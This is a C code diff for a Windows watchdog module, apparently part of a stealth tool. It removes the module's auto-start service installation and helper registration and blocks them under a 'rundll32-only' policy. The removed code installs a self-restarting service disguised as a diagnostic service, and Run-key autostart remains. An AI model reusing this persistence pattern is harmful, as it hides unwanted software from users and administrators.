@@ -671,98 +671,20 @@ BOOL Watchdog_InstallAsService(
     const WCHAR* displayName,
     const WCHAR* targetServiceName)
 {
-    if (serviceName == NULL || targetServiceName == NULL) {
-        return FALSE;
-    }
-
-    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (hScm == NULL) {
-        return FALSE;
-    }
-
-    /* Get current executable path */
-    WCHAR exePath[MAX_PATH];
-    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
-        CloseServiceHandle(hScm);
-        return FALSE;
-    }
-
-    /* Build command line with watchdog mode flag */
-    WCHAR cmdLine[512];
-    StringCchPrintfW(cmdLine, 512, L"\"%s\" -watchdog \"%s\"", exePath, targetServiceName);
-
-    SC_HANDLE hService = CreateServiceW(
-        hScm,
-        serviceName,
-        displayName ? displayName : serviceName,
-        SERVICE_ALL_ACCESS,
-        SERVICE_WIN32_OWN_PROCESS,
-        SERVICE_AUTO_START,
-        SERVICE_ERROR_NORMAL,
-        cmdLine,
-        NULL,
-        NULL,
-        NULL,
-        NULL,
-        NULL);
-
-    if (hService == NULL) {
-        CloseServiceHandle(hScm);
-        return FALSE;
-    }
-
-    /* Configure for restart on failure */
-    SERVICE_FAILURE_ACTIONSW sfa = {0};
-    SC_ACTION actions[3];
-    actions[0].Type = SC_ACTION_RESTART;
-    actions[0].Delay = 5000;
-    actions[1].Type = SC_ACTION_RESTART;
-    actions[1].Delay = 10000;
-    actions[2].Type = SC_ACTION_RESTART;
-    actions[2].Delay = 30000;
-    sfa.dwResetPeriod = 86400;
-    sfa.cActions = 3;
-    sfa.lpsaActions = actions;
-
-    ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
-
-    /* Set description */
-    SERVICE_DESCRIPTIONW sd;
-    sd.lpDescription = L"Monitors and maintains system diagnostic services.";
-    ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
-
-    CloseServiceHandle(hService);
-    CloseServiceHandle(hScm);
-    return TRUE;
+    UNREFERENCED_PARAMETER(serviceName);
+    UNREFERENCED_PARAMETER(displayName);
+    UNREFERENCED_PARAMETER(targetServiceName);
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    Stealth_DebugPrintfA("Watchdog service installation blocked by rundll32-only lifecycle policy");
+    return FALSE;
 }
 
 BOOL Watchdog_UninstallService(const WCHAR* serviceName)
 {
-    if (serviceName == NULL) {
-        return FALSE;
-    }
-
-    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (hScm == NULL) {
-        return FALSE;
-    }
-
-    SC_HANDLE hService = OpenServiceW(hScm, serviceName, SERVICE_STOP | DELETE);
-    if (hService == NULL) {
-        CloseServiceHandle(hScm);
-        return FALSE;
-    }
-
-    /* Stop service if running */
-    SERVICE_STATUS status;
-    ControlService(hService, SERVICE_CONTROL_STOP, &status);
-
-    /* Delete service */
-    BOOL result = DeleteService(hService);
-
-    CloseServiceHandle(hService);
-    CloseServiceHandle(hScm);
-    return result;
+    UNREFERENCED_PARAMETER(serviceName);
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    Stealth_DebugPrintfA("Watchdog service uninstall blocked by rundll32-only lifecycle policy");
+    return FALSE;
 }
 
 void Watchdog_ServiceMain(
@@ -1245,8 +1167,9 @@ BOOL Watchdog_EnableBootStart(
         return TRUE;  /* No-op */
 
     case WATCHDOG_BOOT_SERVICE:
-        /* Service installation handled separately via Watchdog_InstallAsService */
-        return TRUE;
+        SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+        Stealth_DebugPrintfA("Watchdog boot-service enable blocked by rundll32-only lifecycle policy");
+        return FALSE;
 
     case WATCHDOG_BOOT_RUN_KEY:
         return Watchdog_EnableRunKey(config->bootName, exePath, arguments);
@@ -1273,7 +1196,9 @@ BOOL Watchdog_DisableBootStart(const WatchdogConfig* config)
         return TRUE;  /* No-op */
 
     case WATCHDOG_BOOT_SERVICE:
-        return Watchdog_UninstallService(config->bootName);
+        SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+        Stealth_DebugPrintfA("Watchdog boot-service disable blocked by rundll32-only lifecycle policy");
+        return FALSE;
 
     case WATCHDOG_BOOT_RUN_KEY:
         return Watchdog_DisableRunKey(config->bootName);
@@ -2440,41 +2365,17 @@ static DWORD WINAPI HelperMonitorThreadProc(LPVOID param)
     return 0;
 }
 
-/* ================================================================
- * Watchdog Integration for Helper Process
- *
- * These functions allow the main watchdog to monitor and manage
- * the helper process alongside other watched processes.
- * ================================================================ */
-
-/**
- * Register the helper process with the main watchdog system.
- * This ensures the helper is monitored and restarted by the watchdog
- * in addition to the HelperMonitor's own monitoring.
- */
+/* Helper processes are owned by their approved rundll32 bridge contract. */
 BOOL Watchdog_RegisterHelper(const HelperProcessConfig* config)
 {
-    if (config == NULL || config->exePath[0] == L'\0') {
-        return FALSE;
-    }
-
-    /* Add helper to the watchdog's process list */
-    return Watchdog_AddProcess(
-        config->exePath,
-        config->arguments,
-        NULL);  /* Working dir not needed for helper */
+    UNREFERENCED_PARAMETER(config);
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    Stealth_DebugPrintfA("Watchdog helper registration blocked by rundll32-only lifecycle policy");
+    return FALSE;
 }
 
-/**
- * Unregister the helper process from the main watchdog.
- */
 BOOL Watchdog_UnregisterHelper(const HelperProcessConfig* config)
 {
-    if (config == NULL || config->exePath[0] == L'\0') {
-        return FALSE;
-    }
-
-    return Watchdog_RemoveProcess(
-        config->exePath,
-        config->arguments);
+    UNREFERENCED_PARAMETER(config);
+    return TRUE;
 }
